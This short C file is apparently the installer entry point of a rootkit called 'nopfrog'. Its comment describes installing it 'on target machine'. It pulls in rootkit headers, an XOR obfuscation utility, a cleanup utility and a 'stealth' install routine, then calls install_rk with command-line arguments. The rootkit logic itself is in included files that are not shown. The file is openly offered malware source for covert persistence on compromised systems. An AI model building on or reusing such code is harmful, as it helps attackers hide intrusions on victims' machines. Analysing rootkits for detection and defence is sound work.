/* 
    Handles nopfrog setup and installation on target machine 
*/
#define DEBUG
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include "utils/clean.c"
#include "utils/xor.c"
#include "rk.h"
#include "rkconsts.h"
#include "stealth/install_rk.c"


int main(int argc, char **argv) {
    install_rk(argv[1], argv[2]);
}